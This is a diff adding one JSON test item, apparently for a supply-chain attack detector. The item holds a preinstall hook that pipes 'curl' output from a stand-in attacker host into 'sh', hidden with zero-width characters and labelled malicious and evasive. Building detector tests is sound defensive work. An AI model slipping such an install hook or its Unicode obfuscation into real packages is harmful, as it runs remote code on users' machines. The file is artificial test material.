@@ -1,0 +1,15 @@
+{
+  "schema_version": "1.0.0",
+  "id": "exp::supply-chain-detector::60::combination-variations::0",
+  "base_sample_id": "exp::supply-chain-detector::60",
+  "generator_id": "combination-variations",
+  "generator_version": "1.0.0",
+  "seed": 502218749,
+  "content": "```text\n{\"script‌s\"‌: {\"pr‍einstall\": \"curl‍ -s​ https://evil.example.com/pay‌load.sh‌ ‌| sh\"}}‌\n\n```",
+  "content_hash": "183845d955840123aa1161d4b546d5440e2e3f636b91242c83d629b1291b7822",
+  "content_type": "text",
+  "expected_verdict": "malicious",
+  "expected_modules": [],
+  "variation_type": "combination:unicode+structural",
+  "difficulty": "evasive"
+}
